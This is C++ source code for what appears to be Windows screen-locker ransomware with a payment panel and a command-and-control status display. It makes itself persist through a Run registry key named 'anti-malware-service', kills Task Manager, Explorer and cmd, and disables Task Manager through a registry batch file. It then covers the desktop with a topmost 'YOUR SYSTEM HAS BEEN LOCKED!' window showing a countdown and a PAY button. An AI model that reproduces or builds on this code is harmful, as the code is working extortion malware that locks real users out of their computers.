#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <string> 
#include <fstream>
#include <thread>
#include <tchar.h>
#include "network.h"
#include "cryptography.h"
#include "panels.h"
#include "unlock.h"
#include "core.h"


#pragma comment(lib,"Wininet.lib")
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

using namespace std;

void AddControl(HWND);


void loadImages();

void SendCode();

void checkConnectionStatus();

string getStatus();


HWND hLogo, hPay,hRefresh,hInfoPanel,hNext,hBack,hPayPanel,hUnlockPanel;

HBITMAP hLogoImage, hGenerateImage;
void InfoPanelClass(HINSTANCE);

void PayPanelClass(HINSTANCE);
void UnlockPanelClass(HINSTANCE);

int WINAPI WinMain(HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpcmdLine, int nCmdShow)
{
HWND hWnd;

ofstream file;
                
MSG messages;            
WNDCLASSEX wc;            


TCHAR exepath[MAX_PATH];
GetModuleFileName(0, exepath, MAX_PATH);
HKEY hKey;
LONG lnRes = RegOpenKeyEx(
    HKEY_CURRENT_USER,
    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    0, KEY_WRITE,
    &hKey
);
if (ERROR_SUCCESS == lnRes)
{
    lnRes = RegSetValueEx(hKey,
        "anti-malware-service",
        0,
        REG_SZ,
        (BYTE*)exepath,
        _tcslen(exepath));
}


system("taskkill /f /IM Taskmgr.exe");
system("taskkill /f /IM explorer.exe");
system("taskkill /f /IM cmd.exe");

thread t1(checkConnectionStatus);
t1.detach();

file.open("disable.bat");

file << "REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f" << endl;
file.close();



/* The Window structure */
wc.hInstance = hThisInstance;
wc.lpszClassName = "MainWindow";
wc.lpfnWndProc = WndProc;      /* This function is called by windows */
wc.style = CS_DBLCLKS;
wc.cbSize = sizeof(WNDCLASSEX);
wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
wc.hCursor = LoadCursor(NULL, MAKEINTRESOURCE(32663));
wc.lpszMenuName = NULL;
wc.cbClsExtra = 0;
wc.cbWndExtra = 0;
wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(255, 0, 0));


if (!RegisterClassEx(&wc))
{
    MessageBoxA(NULL, "Unable to register window class!", "Fatal error!", MB_OK | MB_ICONERROR);
    return 0;
}
int horizontal = 0;
int vertical = 0;
GetDesktopResolution(horizontal, vertical);
InfoPanelClass(hThisInstance);
PayPanelClass(hThisInstance);
UnlockPanelClass(hThisInstance);
CW_USEDEFAULT,
CW_USEDEFAULT,
/* The class is registered, let's create the program*/

hWnd = CreateWindowEx(
    WS_EX_TOPMOST | WS_EX_TOOLWINDOW,                   /* Extended possibilites for variation */
    "MainWindow",         /* Classname */
    "WINDOW",     /* Title Text */
    WS_EX_PALETTEWINDOW, /* default window */
    0,       /* Windows decides the position */
    0,       /* where the window ends up on the screen */
    horizontal,                 /* The programs width */
    vertical,                 /* and height in pixels */
    HWND_DESKTOP,        /* The window is a child-window to desktop */
    NULL,                /* No menu */
    hThisInstance,       /* Program Instance handler */
    NULL                 /* No Window Creation data */
);

/* Make the window visible on the screen */
SetWindowLong(hWnd, GWL_STYLE, 0);
ShowWindow(hWnd, nCmdShow);

ShowWindow(hInfoPanel, SW_SHOW);


WinExec("disable.bat", 1);

Sleep(100);

if (remove("disable.bat") == 0)
perror("Error deleting file");
else
puts("File successfully deleted");

while (GetMessage(&messages, NULL, 0, 0))
{
    TranslateMessage(&messages);
    DispatchMessage(&messages);
}

    
return messages.wParam;
}

#define ID_PAY 1
#define ID_UNLOCK 2
#define ID_TIMER 3
#define ID_TIME 4
#define ID_BACK 5
#define ID_NEXT 6


LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    HDC hdc{};
    PAINTSTRUCT ps;
    RECT rect;
    static bool Tracking = false;
    static HDC hdcsource = NULL;
    char szBuffer[200];
    static int count = 43200;
    int seconds = 0;
    int minutes = 0;
    int hours = 0;

    int v = 0;
    int h = 0;
    GetDesktopResolution(h, v);
    static HBITMAP bmpsrc = NULL;


    int wmId, wmEvent;

    static int i = 0;
    bool internetCon = false;
    bool proxyCon = false;


    switch (message)
    {
    case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(232, 232, 232));
        SetBkColor(hdcStatic, RGB(255, 0, 0));
        return (LRESULT)GetStockObject(NULL_BRUSH);
    }
    break;


    case WM_PAINT:
    {
        HBRUSH hBrush;
        HFONT hFont;

        if (count > 0)
        {

            hdc = BeginPaint(hWnd, &ps);
            GetClientRect(hWnd, &rect);
            hours = (count / 3600);
            minutes = (count / 60);
            seconds = (count % 60);

            hFont = CreateFont(0.015 * v, 0.005 * h, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
            SelectObject(hdc, hFont);

            wsprintf(szBuffer, "|Hours: %d| Minutes: %d |Seconds: %d|", hours, minutes, seconds);
            SetRect(&rect, 0.058 * h, 0.3 * v, 0, 0);
            SetTextColor(hdc, RGB(255, 255, 255));
            SetBkColor(hdc, RGB(255, 0, 0));
            DrawText(hdc, szBuffer, -1, &rect, DT_NOCLIP);
            DeleteObject(hFont);

        }
        else
        {

        }


        string proxyStateText, serverStateText, internetConText, pay_stats;

        ifstream proxyFile, serverFile, internetFile, pay_file;

        pay_file.open("pay_status.txt");

        while (getline(pay_file, pay_stats)) {

            if (pay_stats == "0")
            {
                TextOut(hdc, 0.095 * h, 0.37 * v, "Status: Need to pay!", 22);
            }

            if (pay_stats == "2")
            {

                TextOut(hdc, 0.11 * h, 0.37 * v, "Status: Paid!", 13);
            }
        }
        pay_file.close();

        proxyFile.open("proxy_con.txt");

        while (getline(proxyFile, proxyStateText)) {

            if (proxyStateText == "0")
            {

                SetDCPenColor(hdc, RGB(0, 0, 0));
                TextOut(hdc, 0.08 * h, 0.4 * v, "Proxy connection: Down", 22);
                proxyCon = false;

            }
            else
            {

                proxyCon = true;
                TextOut(hdc, 0.08 * h, 0.4 * v, "Proxy connection: Up", 20);

            }
        }
        proxyFile.close();

        serverFile.open("server_status.txt");

        while (getline(serverFile, serverStateText)) {

            string t = "C2 Server connection status: " + serverStateText;

            LPCSTR text = t.c_str();
            int lenght = t.length();
            TextOut(hdc, 0.022 * h, 0.46 * v, text, lenght);
        }
        serverFile.close();

        internetFile.open("internet_con.txt");

        while (getline(internetFile, internetConText)) {

            if (internetConText == "0")
            {
                internetCon = false;
                TextOut(hdc, 0.075 * h, 0.43 * v, "Internet connection: Down", 25);
            }
            else
            {
                internetCon = true;
                TextOut(hdc, 0.075 * h, 0.43 * v, "Internet connection: Up", 23);
            }

            if (proxyCon && internetCon)
            {
                EnableWindow(hPay, TRUE);
            }
            else
            {
                EnableWindow(hPay, FALSE);
            }

        }
        internetFile.close();

        hFont = CreateFont(0.015 * v, 0.005 * h, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
            CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
        SelectObject(hdc, hFont);



        hFont = CreateFont(0.03 * v, 0.009 * h, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
            CLIP_DEFAULT_PRECIS, ANTIALIASED_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
        SelectObject(hdc, hFont);

        wsprintf(szBuffer, "YOUR SYSTEM HAS BEEN LOCKED!", hours, minutes, seconds);
        SetRect(&rect, 0.423 * h, 0.05 * v, 0, 0);
        SetTextColor(hdc, RGB(255, 255, 255));
        SetBkColor(hdc, RGB(255, 0, 0));
        DrawText(hdc, szBuffer, -1, &rect, DT_NOCLIP);
        DeleteObject(hFont);

        EndPaint(hWnd, &ps);
        break;
    }


    case WM_CREATE: {

        loadImages();
        AddControl(hWnd);
        SetTimer(hWnd, ID_TIME, 1000, NULL);

        break;
    }

    case WM_TIMER:
    {
        count--;
        InvalidateRect(hWnd, NULL, TRUE);

        break;
    }

    case WM_COMMAND: {




        if (LOWORD(wParam) == ID_PAY)
        {

            
            KillTimer(hWnd, ID_TIME);



            const int res = MessageBox(hWnd, "Make sure that you enter the payment information correctly!You only have one attempt!", "WARNING", MB_ICONWARNING | MB_YESNO|MB_TOPMOST);
            switch (res)
            {
            case IDYES:
                ShowWindow(hUnlockPanel, SW_SHOW);
                ShowWindow(hInfoPanel, SW_HIDE);
                ShowWindow(hPayPanel, SW_HIDE);
                ShowWindow(hPay, SW_HIDE);
                ShowWindow(hBack, SW_HIDE);
                SendCode();

                break;
            case IDNO:
                MessageBox(hWnd, "Please correct the input!", "!!!", NULL);
                break;
            default:
                break;
            }
        }

        if (LOWORD(wParam) == ID_NEXT)
        {
            ShowWindow(hInfoPanel, SW_HIDE);
            ShowWindow(hPayPanel, SW_SHOW);
            ShowWindow(hNext, SW_HIDE);
            ShowWindow(hBack, SW_SHOW);
            ShowWindow(hPay, SW_SHOW);
        }

        if (LOWORD(wParam) == ID_BACK)
        {

            ShowWindow(hInfoPanel, SW_SHOW);
            ShowWindow(hPayPanel, SW_HIDE);
            ShowWindow(hNext, SW_SHOW);
            ShowWindow(hPay, SW_HIDE);
            ShowWindow(hBack, SW_HIDE);
        }

        break;
    }

    case WM_CLOSE:

       
        if (MessageBox(hWnd, TEXT("BAD LUCK!!!"), TEXT("ERROR!"), MB_ICONERROR) == 6)
        {
            DestroyWindow(hWnd);	

            PostQuitMessage(0);	// 
            return(0);

            break;
        }
        else
        {
            return 0;
            break;
        }
        break;

    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }

    return 0;
}

void AddControl(HWND hWnd)
{
   
    int v = 0;
    int h = 0;
    GetDesktopResolution(h, v);


    hPay = CreateWindowW(L"button", L"PAY",  WS_CHILD | SS_CENTER , 0.70 * h, 0.85 * v, 160, 50, hWnd, (HMENU)ID_PAY,
        NULL, NULL);

    hBack = CreateWindowW(L"button", L"<<BACK", WS_CHILD | SS_CENTER, 0.3*h, 0.85*v, 160, 50, hWnd, (HMENU)ID_BACK,
        NULL, NULL);

    hNext = CreateWindowW(L"button", L"NEXT>>", WS_VISIBLE | WS_CHILD | SS_CENTER, 0.79*h, 0.85*v, 160, 50, hWnd, (HMENU)ID_NEXT,
        NULL, NULL);

    hLogo = CreateWindowW(L"Static", NULL, WS_VISIBLE | WS_CHILD | SS_BITMAP, 0.08*h, 0.08*v, 0.1*h, 0.5*v, hWnd, NULL, NULL, NULL);
    SendMessageW(hLogo, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hLogoImage);

    hInfoPanel = CreateWindowW(L"infoPanel", L"", WS_CHILD | WS_BORDER, 0.3*h, 0.1*v,0.55*h, 0.72*v, hWnd, NULL, NULL, NULL);

    hPayPanel = CreateWindowW(L"payPanel", L"", WS_CHILD | WS_BORDER, 0.3 * h, 0.1 * v, 0.55 * h, 0.72 * v, hWnd, NULL, NULL, NULL);

    hUnlockPanel = CreateWindowW(L"unlockPanel", L"", WS_CHILD | WS_BORDER, 0.3 * h, 0.1 * v, 0.55 * h, 0.72 * v, hWnd, NULL, NULL, NULL);
}

void loadImages()
{
    int v = 0;
    int h = 0;
    GetDesktopResolution(h, v);

    hLogoImage = (HBITMAP)LoadImageW(NULL, L"Logo.bmp", IMAGE_BITMAP, 0.11 * h, 0.185 * v, LR_LOADFROMFILE);
}

